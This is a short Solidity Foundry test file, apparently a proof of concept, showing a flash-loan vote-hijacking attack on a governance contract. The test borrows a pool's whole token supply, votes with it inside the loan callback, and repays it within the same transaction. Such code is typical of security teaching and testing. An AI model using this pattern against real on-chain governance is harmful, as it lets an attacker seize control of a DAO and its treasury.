// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/GovernanceToken.sol";
import "../src/FlashLoanPool.sol";
import "../src/Governance.sol";

contract GovernanceTest is Test, IFlashLoanReceiver {
    GovernanceToken public token;
    FlashLoanPool public pool;
    Governance public gov;

    address public hacker = address(0x1337);

    function setUp() public {
        token = new GovernanceToken(1_000_000);
        pool = new FlashLoanPool(address(token));
        gov = new Governance(address(token));
        require(token.transfer(address(pool), 1_000_000), "Transfer failed");
    }

    function testFlashLoanVoteHijacking() public {
        pool.flashLoan(1_000_000);
        assertEq(gov.yesVotes(), 1_000_000);
        assertEq(token.balanceOf(address(this)), 0);
    }

    function executeOperation(uint256 amount) external {
        gov.vote();
        require(token.transfer(msg.sender, amount), "Transfer failed");
    }
}
